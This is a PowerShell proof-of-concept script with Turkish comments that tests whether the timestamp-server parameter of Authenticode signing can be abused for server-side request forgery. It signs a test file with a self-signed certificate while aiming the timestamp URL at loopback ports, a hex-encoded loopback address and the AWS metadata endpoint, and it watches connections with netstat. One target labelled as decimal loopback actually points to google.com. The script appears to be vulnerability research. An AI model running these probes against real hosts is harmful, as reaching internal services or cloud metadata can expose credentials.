# ============================================================
# PoC v2: SSRF + Network Activity Monitor
# ============================================================

$cert = New-SelfSignedCertificate `
    -Subject "CN=SSRF PoC Test" `
    -CertStoreLocation "Cert:\CurrentUser\My" `
    -KeyUsage DigitalSignature `
    -Type CodeSigningCert

$testFile = "$env:TEMP\ssrf_poc_test.ps1"
"Write-Host 'PoC Test File'" | Set-Content $testFile

# ============================================================
# Network Monitor — arka planda çalışır
# ============================================================
$monitorJob = Start-Job -ScriptBlock {
    $hits = @()
    $seen = @{}

    while ($true) {
        $conns = netstat -an 2>$null | Select-String "SYN_SENT|ESTABLISHED"
        
        foreach ($line in $conns) {
            $str = $line.ToString().Trim()
            if (-not $seen.ContainsKey($str)) {
                $seen[$str] = $true
                $hits += "[$(Get-Date -Format 'HH:mm:ss.fff')] $str"
            }
        }
        Start-Sleep -Milliseconds 50
    }
} 

Write-Host "[*] Network monitor başladı (Job ID: $($monitorJob.Id))" -ForegroundColor Cyan
Start-Sleep -Milliseconds 500

# ============================================================
# Test Fonksiyonu
# ============================================================
function Test-SSRFTarget {
    param([string]$Url, [string]$Label)

    Write-Host "`n[>>] Testing: $Label" -ForegroundColor Yellow
    Write-Host "     URL: $Url"

    $start = Get-Date

    try {
        $result = Set-AuthenticodeSignature `
            -FilePath $testFile `
            -Certificate $cert `
            -TimestampServer $Url `
            -ErrorAction Stop

        $elapsed = ((Get-Date) - $start).TotalMilliseconds

        [PSCustomObject]@{
            Label   = $Label
            URL     = $Url
            Status  = $result.Status
            Elapsed = "$([math]::Round($elapsed))ms"
        }
    }
    catch {
        $elapsed = ((Get-Date) - $start).TotalMilliseconds
        [PSCustomObject]@{
            Label   = $Label
            URL     = $Url
            Status  = "Exception: $($_.Exception.Message)"
            Elapsed = "$([math]::Round($elapsed))ms"
        }
    }
}

# ============================================================
# Targets
# ============================================================
$targets = @(
    @{ Url = "http://127.0.0.1:80/";                      Label = "Loopback:80" },
    @{ Url = "http://127.0.0.1:8080/";                    Label = "Loopback:8080" },
    @{ Url = "http://google.com/";                         Label = "Loopback decimal" },
    @{ Url = "http://0x7f000001/";                         Label = "Loopback hex" },
    @{ Url = "http://169.254.169.254/latest/meta-data/";  Label = "AWS metadata" },
    @{ Url = "http://this-host-does-not-exist-xyz.local/"; Label = "Nonexistent (baseline)" }
)

$results = foreach ($t in $targets) {
    Test-SSRFTarget -Url $t.Url -Label $t.Label
    Start-Sleep -Milliseconds 200
}

# ============================================================
# Network Monitor Durdur ve Sonuçları Al
# ============================================================
Start-Sleep -Milliseconds 500
Stop-Job $monitorJob
$networkHits = Receive-Job $monitorJob
Remove-Job $monitorJob

# ============================================================
# Rapor
# ============================================================
Write-Host "`n`n=== SONUÇLAR ===" -ForegroundColor Green
$results | Format-Table -AutoSize

Write-Host "`n=== NETWORK AKTİVİTESİ ===" -ForegroundColor Green
if ($networkHits) {
    $networkHits | ForEach-Object { Write-Host $_ -ForegroundColor Red }
} else {
    Write-Host "[-] Hiç TCP bağlantısı yakalanmadı" -ForegroundColor Gray
}

# ============================================================
# Wireshark için hatırlatma
# ============================================================
Write-Host "`n=== WİRESHARK İPUCU ===" -ForegroundColor Cyan
Write-Host "Loopback trafiği için:"
Write-Host "  Interface : 'Npcap Loopback Adapter' seç"
Write-Host "  Filter    : tcp or udp port 80 or port 443 or port 318"
Write-Host "Dış trafik için:"
Write-Host "  Interface : aktif ethernet/wifi adapter"
Write-Host "  Filter    : ip.dst != 192.168.0.0/16 and tcp"

# Temizlik
# Remove-Item $testFile -ErrorAction SilentlyContinue
# Remove-Item "Cert:\CurrentUser\My\$($cert.Thumbprint)"
